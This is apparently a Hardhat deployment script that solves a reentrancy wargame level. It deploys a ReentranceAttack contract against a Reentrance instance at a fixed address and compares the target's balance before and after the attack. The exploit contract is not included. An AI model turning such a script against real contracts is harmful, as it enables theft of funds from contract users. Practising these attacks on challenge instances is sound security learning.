import { ethers } from "hardhat";
import { Reentrance__factory } from "../typechain/factories/contracts/Reentrance__factory";
import { ReentranceAttack__factory } from "../typechain/factories/contracts/ReentranceAttack__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x2c42B4ec1195936F13b16a575870763231E43eDE";
    let reentrance = new Reentrance__factory(signer).attach(instance_address);
    console.log(await provider.getBalance(instance_address));

    
    let attack = await new ReentranceAttack__factory(signer).deploy();
    await attack.deployed();

    let tx = await attack.attack(reentrance.address, {value:ethers.utils.parseEther("0.001")});
    await tx.wait();
    console.log(await provider.getBalance(instance_address));

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
